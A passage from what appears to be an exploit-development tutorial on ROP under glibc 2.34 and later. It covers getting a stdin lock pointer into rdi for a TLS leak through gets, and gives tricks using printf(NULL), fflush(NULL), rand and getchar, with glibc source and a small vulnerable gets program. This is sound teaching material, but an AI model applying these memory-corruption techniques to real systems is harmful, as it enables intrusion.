<p><code>p.sendline(b&quot;CCCC&quot;)</code> will write a null byte into the <code>LSB</code> of <code>cnt</code>. In <code>_IO_lock_unlock</code>, <code>cnt</code> gets decremented as <code>cnt != 0</code>, which converts the <code>\x00</code> into <code>\xff</code>, and just like before, the unlocking will leave <code>owner</code> alone.</p>
<p>And just like that, we now have padding upto <code>owner=TLS</code>.</p>
<p>This version of the leak will actually work before 2.37 as well, so this is the more versatile one.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-if-rdi--_io_stdfile_0_lock">What if <code>rdi != _IO_stdfile_0_lock</code>?<a href="#what-if-rdi--_io_stdfile_0_lock" class="hash-link" aria-label="Direct link to what-if-rdi--_io_stdfile_0_lock" title="Direct link to what-if-rdi--_io_stdfile_0_lock">​</a></h2>
<p>This is all pretty cool (in my opinion at least <del>if you disagree you&#x27;re wrong</del>), but what if we were presented the following program:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0x20</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;ROP me if you can!&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">gets</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;No lock for you ;)&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>Now we have a problem. While <code>gets</code> would place <code>_IO_stdfile_0_lock</code> into <code>rdi</code>, the subequent <code>puts</code> call would clobber it. Now what?</p>
<p>Ideally we&#x27;d want to find a way to put <code>_IO_stdfile_0_lock</code> into <code>rdi</code>, and fortunately there are a few tricks we can use in certain cases:</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="case-1-rdi-is-writable">Case 1: <code>rdi</code> is writable<a href="#case-1-rdi-is-writable" class="hash-link" aria-label="Direct link to case-1-rdi-is-writable" title="Direct link to case-1-rdi-is-writable">​</a></h3>
<p>Even if it isn&#x27;t <code>_IO_stdfile_0_lock</code>, any writable <code>rdi</code> would be a valid condidate for a <code>gets</code> call, which would then put <code>_IO_stdfile_0_lock</code> back into <code>rdi</code>!</p>
<p>A common case for this is after some other IO function. Recall that most IO functions follow that locking pattern, which includes <code>puts</code>. So in the above example, <code>rdi</code> would be <code>_IO_stdfile_1_lock</code>, which we can just call <code>gets</code> on to get our beloved <code>_IO_stdfile_0_lock</code>. For dealing with another IO lock, you can use <code>p.sendline(b&quot;\x01&quot;)</code>, as the expected value for <code>lock</code> will be <code>1</code> (<code>LLL_LOCK_INITIALIZER_LOCKED</code>).</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="case-2-rdi-is-readable">Case 2: <code>rdi</code> is readable<a href="#case-2-rdi-is-readable" class="hash-link" aria-label="Direct link to case-2-rdi-is-readable" title="Direct link to case-2-rdi-is-readable">​</a></h3>
<p>While this won&#x27;t make for a valid candidate for <code>gets</code>, it would make a valid candidate for <code>puts</code>, so call to <code>puts</code> would put into <code>Case 1</code>, and so you can then apply the above.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="case-3-rdi--null">Case 3: <code>rdi == NULL</code><a href="#case-3-rdi--null" class="hash-link" aria-label="Direct link to case-3-rdi--null" title="Direct link to case-3-rdi--null">​</a></h3>
<p>This won&#x27;t be usable in most IO functions unfortunately. But <code>printf</code> isn&#x27;t just another IO function, it&#x27;s built <strong>different</strong>. Let&#x27;s take a look shall we? Don&#x27;t worry, we won&#x27;t go too far ;)</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="printfscanf">printf/scanf<a href="#printfscanf" class="hash-link" aria-label="Direct link to printf/scanf" title="Direct link to printf/scanf">​</a></h4>
<p>Note that <code>scanf</code> follows a very similar pattern, and displays the same behaviour as printf in this regard.</p>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/printf.c#L27" target="_blank" rel="noopener noreferrer">printf</a> is defined as follows:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">int</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">__printf</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">format</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  va_list arg</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> done</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">va_start</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">arg</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> format</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  done </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">__vfprintf_internal</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stdout</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> format</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> arg</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">va_end</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">arg</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> done</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>Here we see it calls <code>__vfprintf_internal</code> with the first argument (i.e. <code>rdi</code>) being <code>stdout</code>.</p>
<p>Then in <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/vfprintf-internal.c#L1179" target="_blank" rel="noopener noreferrer">__vfprintf_internal</a> we see that early on it calls <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/vfprintf-internal.c#L49" target="_blank" rel="noopener noreferrer">ARGCHECK</a></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">int</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">vfprintf</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">FILE </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> CHAR_T </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">format</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> va_list ap</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> mode_flags</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">/* Sanity check of arguments.  */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">ARGCHECK</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> format</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name function" style="color:#d73a49">ARGCHECK</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">S</span><span class="token macro property expression punctuation" style="color:#393A34">,</span><span class="token macro property expression" style="color:#36acaa"> Format</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression keyword" style="color:#00009f">do</span><span class="token macro property expression" style="color:#36acaa">									      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">    </span><span class="token macro property expression punctuation" style="color:#393A34">{</span><span class="token macro property expression" style="color:#36acaa">									      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property comment" style="color:#999988;font-style:italic">/* Check file argument for consistence.  */</span><span class="token macro property" style="color:#36acaa">			      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression function" style="color:#d73a49">CHECK_FILE</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">S</span><span class="token macro property expression punctuation" style="color:#393A34">,</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression operator" style="color:#393A34">-</span><span class="token macro property expression number" style="color:#36acaa">1</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">						      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression keyword" style="color:#00009f">if</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">S</span><span class="token macro property expression operator" style="color:#393A34">-&gt;</span><span class="token macro property expression" style="color:#36acaa">_flags </span><span class="token macro property expression operator" style="color:#393A34">&amp;</span><span class="token macro property expression" style="color:#36acaa"> _IO_NO_WRITES</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa">					      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	</span><span class="token macro property expression punctuation" style="color:#393A34">{</span><span class="token macro property expression" style="color:#36acaa">								      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	  </span><span class="token macro property expression" style="color:#36acaa">S</span><span class="token macro property expression operator" style="color:#393A34">-&gt;</span><span class="token macro property expression" style="color:#36acaa">_flags </span><span class="token macro property expression operator" style="color:#393A34">|=</span><span class="token macro property expression" style="color:#36acaa"> _IO_ERR_SEEN</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">					      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	  </span><span class="token macro property expression function" style="color:#d73a49">__set_errno</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">EBADF</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">						      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	  </span><span class="token macro property expression keyword" style="color:#00009f">return</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression operator" style="color:#393A34">-</span><span class="token macro property expression number" style="color:#36acaa">1</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">							      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	</span><span class="token macro property expression punctuation" style="color:#393A34">}</span><span class="token macro property expression" style="color:#36acaa">								      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression keyword" style="color:#00009f">if</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">Format </span><span class="token macro property expression operator" style="color:#393A34">==</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression constant" style="color:#36acaa">NULL</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa">						      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	</span><span class="token macro property expression punctuation" style="color:#393A34">{</span><span class="token macro property expression" style="color:#36acaa">								      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	  </span><span class="token macro property expression function" style="color:#d73a49">__set_errno</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">EINVAL</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">						      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	  </span><span class="token macro property expression keyword" style="color:#00009f">return</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression operator" style="color:#393A34">-</span><span class="token macro property expression number" style="color:#36acaa">1</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">							      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	</span><span class="token macro property expression punctuation" style="color:#393A34">}</span><span class="token macro property expression" style="color:#36acaa">								      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">    </span><span class="token macro property expression punctuation" style="color:#393A34">}</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression keyword" style="color:#00009f">while</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression number" style="color:#36acaa">0</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>The main takeaway from all of this is that <code>ARGCHECK</code> forces <code>printf</code> to return early if <code>format == NULL</code>, meaning it won&#x27;t <code>SEGFAULT</code>. And since <code>__vfprintf_internal</code> was called with <code>stdout</code> as the first argument, we can guess that it should be preserved until returning. So, is it?</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<figure><img src="/assets/image (117).png" alt=""><figcaption><p><code>printf(NULL)</code></p></figcaption></figure>
<p>Yes it is! So now we can just use this as a writable address.</p>
<p>There&#x27;s also a possibility here to use an <code>FSOP</code> technique to get a leak. I won&#x27;t go into detail here, but if you&#x27;re interested here are some links:</p>
<ul>
<li><a href="https://0xdf.gitlab.io/2021/01/16/htb-ropetwo.html#leak-libc" target="_blank" rel="noopener noreferrer">https://0xdf.gitlab.io/2021/01/16/htb-ropetwo.html#leak-libc</a></li>
<li><a href="https://www.willsroot.io/2021/01/rope2-hackthebox-writeup-chromium-v8.html" target="_blank" rel="noopener noreferrer">https://www.willsroot.io/2021/01/rope2-hackthebox-writeup-chromium-v8.html</a></li>
<li><a href="https://vigneshsrao.github.io/posts/babytcache/" target="_blank" rel="noopener noreferrer">https://vigneshsrao.github.io/posts/babytcache/</a></li>
</ul>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="fflush">fflush<a href="#fflush" class="hash-link" aria-label="Direct link to fflush" title="Direct link to fflush">​</a></h4>
<p>Normally <code>fflush</code> is called with a single <code>FILE</code> to flush its contents:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Data: &quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// if stdout is buffered, this may not be printed immediately</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">fflush</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stdout</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>However you can call <code>fflush(NULL)</code>, which will go through every <code>FILE</code> and flush all of them.</p>
<figure><img src="/assets/image (31).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/iofflush.c#L31">fflush</a></p></figcaption></figure>
<p>It does by calling <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/genops.c#L724" target="_blank" rel="noopener noreferrer">_IO_flush_all</a>.</p>
<figure><img src="/assets/image (30).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/genops.c#L714">_IO_flush_all_lockp</a></p></figcaption></figure>
<p>Then at the end of <code>_IO_flush_all(_lockp)</code>, it first unlocks <code>list_all_lock</code>, which is used to lock the list of all <code>FILE</code>&#x27;s. While this would put a lock into <code>rdi</code>, that&#x27;s not what reaches the end.</p>
<p>It then calls <code>_IO_cleanup_region_end(0)</code>, which is effectively just:</p>
<figure><img src="/assets/image (32).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/libc-lock.h#L174">_IO_cleanup_region_end</a></p></figcaption></figure>
<p>This then goes onto call <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/nptl/libc-cleanup.c#L38" target="_blank" rel="noopener noreferrer">__libc_cleanup_pop_restore</a> with a first argument of <code>&amp;_buffer</code>, which is preserved until returning. <code>_buffer</code> is a cleanup buffer, which is stored on the stack, so a stack pointer is returned in <code>rdi</code>! For more information, see <a href="/pwn/ctf-writeups/htb-business-2024/no-gadgets#fun-with-fun-lockfile">here</a>.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="case-4-rdi-is-junk">Case 4: <code>rdi</code> is junk<a href="#case-4-rdi-is-junk" class="hash-link" aria-label="Direct link to case-4-rdi-is-junk" title="Direct link to case-4-rdi-is-junk">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="rand">rand<a href="#rand" class="hash-link" aria-label="Direct link to rand" title="Direct link to rand">​</a></h4>
<p>There&#x27;s actually a non-IO function that can be used here: <code>rand</code>, which returns a pointer to <code>unsafe_state</code> in <code>rdi</code> across a broad range of libc versions. More details on this can be found <a href="/pwn/pwn/fork_gadget#ret2rand">here</a>.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="getcharputchar">getchar/putchar<a href="#getcharputchar" class="hash-link" aria-label="Direct link to getchar/putchar" title="Direct link to getchar/putchar">​</a></h4>
<p>In theory, these functions would be perfect. The argument wouldn&#x27;t matter, and as IO functions <em>usually</em> unlock at the very end, they would place a lock into <code>rdi</code> (<code>getchar</code> would give you <code>_IO_stdfile_0_lock_</code>). Unfortunately, there&#x27;s an optimization in the way: <code>_IO_need_lock</code>.</p>
<figure><img src="/assets/image (34).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/getchar.c#L33">getchar</a></p></figcaption></figure>
<p>So if the <code>FILE</code> is determined to not need a lock, then it doesn&#x27;t use one?</p>
<figure><img src="/assets/image (35).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L212">_IO_need_lock</a></p></figcaption></figure>
<p>It turns out that for some simpler IO functions, the locking can be optimized away in the single-threaded case:</p>
<figure><img src="/assets/image (36).png" alt=""><figcaption><p>Where <code>_IO_need_lock</code> is used.</p></figcaption></figure>
<p>And when a thread is made, <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/genops.c#L517" target="_blank" rel="noopener noreferrer">_IO_enable_locks</a> is called, which ensures all new and old <code>FILE</code>&#x27;s have the <code>_IO_FLAGS2_NEED_LOCK</code> flag set.</p>
<p>So, when the application is multithreaded, <code>getchar</code>/<code>putchar</code> would use locking, otherwise it would just follow the behaviour of <code>_IO_(getc|putc)_unlocked</code>.</p>
<figure><img src="/assets/image (37).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/bits/types/struct_FILE.h#L102">_IO_getc_unlocked</a></p></figcaption></figure>
<p>Since this is a macro, the <code>fp</code> wouldn&#x27;t be loaded into <code>rdi</code>, so the only chance you really have is if <code>__uflow</code> for example did something useful. In <code>getchar</code>, if <code>stdin</code> is unbuffered (or buffer is empty), it will call <code>read(0, ...)</code>, which leaves <code>rdi=0</code>, and maybe you can then use the <code>rdi=NULL</code> case functions.</p>
<p>These are just a few functions which can help, there could be many more that I&#x27;m not aware of. Most of these are just some common ones which have one thing in common: they&#x27;re IO functions.</p>
<p>If anyone has any other tricks for this, I&#x27;d be interested to know, and maybe I&#x27;ll update this to include them, with credit of course :)</p></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/pwn/pwn/rop-2.34+/the-problem"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">The problem</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/pwn/pwn/rop-2.34+/controlling-rbp"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Controlling rbp</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#_io_stdfile_0_lock" class="table-of-contents__link toc-highlight"><code>_IO_stdfile_0_lock</code></a><ul><li><a href="#sidenote-on-finding-locking-functions" class="table-of-contents__link toc-highlight">Sidenote on finding locking functions</a></li><li><a href="#_io_acquire_lock_io_release_lock" class="table-of-contents__link toc-highlight"><code>_IO_acquire_lock</code>/<code>_IO_release_lock</code></a></li><li><a href="#_io_lock_lock_io_lock_unlock" class="table-of-contents__link toc-highlight"><code>_IO_lock_lock</code>/<code>_IO_lock_unlock</code></a></li><li><a href="#_io_stdfile_0_lock-in-rdi" class="table-of-contents__link toc-highlight"><code>_IO_stdfile_0_lock</code> in <code>rdi</code>?</a></li><li><a href="#glibc-prior-to-230" class="table-of-contents__link toc-highlight">glibc prior to <code>2.30</code></a></li><li><a 